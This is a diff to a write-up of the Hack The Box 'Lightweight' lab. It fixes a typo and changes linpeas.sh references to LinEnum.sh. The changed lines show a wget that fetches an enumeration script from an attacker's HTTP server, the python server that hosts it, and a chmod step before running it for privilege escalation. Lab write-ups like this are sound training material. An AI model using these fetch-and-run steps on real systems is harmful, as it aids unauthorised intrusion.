@@ -35,7 +35,7 @@ Out on | 8th December 2018
 
 I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 
 
-Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)
+Download link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)
 
 ___
 ![](/assets/img/lightweight-hackthebox/nmap-automator-1.png)
@@ -213,11 +213,11 @@ Now let's use `LinEnum.sh` again to escalate privileges.
 ___
 ![](/assets/img/lightweight-hackthebox/downloading-linenum-ldapuser1-26.png)
 
-**Command**: *wget http://10.10.14.14:8081/linpeas.sh* 
+**Command**: *wget http://10.10.14.14:8081/LinEnum.sh* 
 
 **Command**: *python3 -m http.server 8081*
 
-Ran LinEnum.sh after giving executing permissions using *chmod +x linpeas.sh* and found this
+Ran LinEnum.sh after giving executing permissions using *chmod +x LinEnum.sh* and found this
 
 ___
 ![](/assets/img/lightweight-hackthebox/posix-capabilities-27.png)
